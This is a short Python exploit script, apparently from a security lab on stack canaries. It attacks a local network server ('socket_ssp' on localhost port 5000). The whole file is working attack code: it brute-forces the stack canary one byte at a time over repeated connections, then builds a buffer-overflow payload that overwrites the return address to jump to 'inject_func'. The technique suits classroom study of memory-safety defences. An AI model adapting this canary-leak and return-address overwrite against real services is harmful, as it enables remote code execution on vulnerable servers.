#!/usr/bin/env python3

import sys
import struct
import socket

# Address of inject_func() used to overwrite return address with.
# Find it using objdump -d -M intel socket_ssp | grep grep '<inject_func>:'.
overwrite_value = 0x4009a5

# Craft payload. Start with buffer contents: offset bytes from beginning
# of buffer to canary value. Stack is:
# -buffer (rbp-0x20)
# -buffer
# -...
# -...
# -canary (rbp-0x8)
# -saved_rbp (rbp)
# -return_address (rbp+0x8)
offset = 24
payload = b'A'*offset


# Find bytes in canary by doing brute force.
def find_canary():
    global payload
    for i in range(8):
        for j in range(255):
            # Connect to server.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("localhost", 5000))

            # Send payload so far plus byte to guess.
            msg = payload+bytes([j])
            s.send(msg)

            # If we sent a correct byte (we matched the byte in canary value)
            # there will be a return message. Add byte to payload.
            ret = s.recv(1000)
            if (len(ret) > 0):
                payload = payload+bytes([j])
                print("Canary byte {:d} is 0x{:02x}".format(i, j))
                break


# Create exploit payload.
def craft_payload():
    global payload
    # Skip saved RBP on stack.
    payload = payload + b'A'*8

    # Add value to overwrite return address (i.e. inject_func()).
    payload = payload + struct.pack("<Q", overwrite_value)


# Send payload to server to call inject_func().
# The payload overwrites the canary value with itself.
def exploit():
    global payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 5000))

    s.send(payload)
    ret = s.recv(1000)
    print("Exploit result: ", ret)


def main():
    find_canary()
    craft_payload()
    exploit()


if __name__ == "__main__":
    sys.exit(main())
